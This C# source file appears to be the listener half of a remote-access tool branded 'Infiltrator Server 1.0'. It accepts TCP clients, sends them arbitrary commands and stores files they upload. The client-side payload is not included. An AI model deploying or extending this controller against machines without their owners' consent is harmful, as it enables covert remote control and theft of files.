using System.Net;
using System.Net.Sockets;
using System.Text;
using Server.GUI;

namespace Server.Conexion
{
    static class ServerSocket
    {
        private static TcpListener listener;
        private static Dictionary<int, TcpClient> clients = new Dictionary<int, TcpClient>();
        private static int clientIdCounter = 0;
        private static bool isRunning;
        private static bool waitingForResponse = false;


        public static bool isWaiting()
        {
            return waitingForResponse;
        }

        public static bool serverStatus()
        {
            return isRunning;
        }
        public static void startServer()
        {
            listener = new TcpListener(IPAddress.Parse(Config.ServerIP), Config.ServerPort);
            listener.Start();

            Thread acceptClientsThread = new Thread(AcceptClients);
            acceptClientsThread.Start();
            isRunning = true;
        }

        public static void stopServer()
        {
            listener.Stop();
            isRunning = false;  
        }
        public static void HandleClient(TcpClient client, int clientId)
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[Config.BufferLength];
            int bytesRead;

            try
            {
                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    string data = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"\nInfiltrator Server 1.0> [Cliente {clientId}]: {data}");

                    // Verificar si se recibió un archivo
                    if (data.StartsWith("FILE:"))
                    {
                        string fileName = data.Substring(5).Trim();
                        Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Recibiendo archivo '{fileName}'...");

                        // Recibir datos del archivo
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bool fileEndReceived = false;
                            long totalBytesReceived = 0;
                            int totalBytesToReceive = 0;

                            while (!fileEndReceived)
                            {
                                bytesRead = stream.Read(buffer, 0, buffer.Length);
                                if (bytesRead == 0)
                                {
                                    // Conexión cerrada
                                    break;
                                }

                                // Verificar si se recibió el mensaje de fin de archivo
                                string chunkAsString = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                                if (chunkAsString.Contains("FILE_END"))
                                {
                                    fileEndReceived = true;
                                    int endIndex = chunkAsString.IndexOf("FILE_END");
                                    ms.Write(buffer, 0, endIndex);
                                    totalBytesReceived += endIndex;
                                }
                                else
                                {
                                    ms.Write(buffer, 0, bytesRead);
                                    totalBytesReceived += bytesRead;
                                }

                                // Actualizar la barra de progreso
                                totalBytesToReceive += bytesRead;
                                Menu.DrawProgressBar((int)totalBytesReceived, totalBytesToReceive, 50);
                            }

                            SaveFile(fileName, ms.ToArray());
                            
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nInfiltrator Server 1.0> [ERROR] Error al manejar al cliente {clientId}: {ex.Message}");
            }

            lock (clients)
            {
                clients.Remove(clientId);
            }

            client.Close();
            Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Cliente {clientId} desconectado.");
        }

        public static void SaveFile(string fileName, byte[] fileData)
        {
            try
            {
                File.WriteAllBytes(fileName, fileData);
                Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Archivo '{fileName}' recibido y guardado correctamente.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nInfiltrator Server 1.0> [ERROR] Error al guardar el archivo '{fileName}': {ex.Message}");
            }
        }

        public static bool IsClientConnected(TcpClient client)
        {
            try
            {
                if (client != null && client.Client != null && client.Client.Connected)
                {
                    // Make a non-blocking call to see if the client is still connected
                    bool part1 = client.Client.Poll(1000, SelectMode.SelectRead);
                    bool part2 = (client.Client.Available == 0);
                    if (part1 && part2)
                        return false;
                    else
                        return true;
                }
                else
                    return false;
            }
            catch
            {
                return false;
            }
        }

        public static void ListClients()
        {
            Console.WriteLine("\n=====================");
            Console.WriteLine("|CLIENTES CONECTADOS|");
            Console.WriteLine("=====================");
            lock (clients)
            {
                if (clients.Count == 0)
                {
                    Console.WriteLine("No hay clientes conectados.");
                }
                else
                {
                    Console.WriteLine("+--------------------------------------+");
                    Console.WriteLine("|       ID       |       Estado        |");
                    Console.WriteLine("+--------------------------------------+");
                    foreach (var client in clients)
                    {
                        string clientStatus = IsClientConnected(client.Value) ? "Conectado" : "Desconectado";
                        Console.WriteLine($"|        {client.Key,-5}   |      {clientStatus,-12}   |");
                    }
                    Console.WriteLine("+--------------------------------------+");
                }
            }


        }

        public static void SendCommand(int clientId, string command)
        {
            lock (clients)
            {
                if (clients.TryGetValue(clientId, out TcpClient client))
                {
                    NetworkStream stream = client.GetStream();
                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    stream.Write(commandBytes, 0, commandBytes.Length);
                }
                else
                {
                    Console.WriteLine($"\nInfiltrator Server 1.0> [!] Cliente {clientId} no encontrado.");
                }
            }

        }
        public static void AcceptClients()
        {
            try
            {
                while (isRunning)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    clientIdCounter++;
                    int clientId = clientIdCounter;

                    lock (clients)
                    {
                        clients.Add(clientId, client);
                    }

                    Console.WriteLine($"\nInfiltrator Server 1.0> [INFO] Cliente {clientId} conectado.");
                    Thread clientThread = new Thread(() => HandleClient(client, clientId));
                    clientThread.Start();
                }
            }
            catch (SocketException)
            {
                // Se produce cuando listener.Stop() es llamado
                Console.WriteLine("\nInfiltrator Server 1.0> [INFO] El servidor ha sido detenido.");
            }
        }

        public static void setWaiting(bool status) {

            waitingForResponse = status;
        }
    }
}
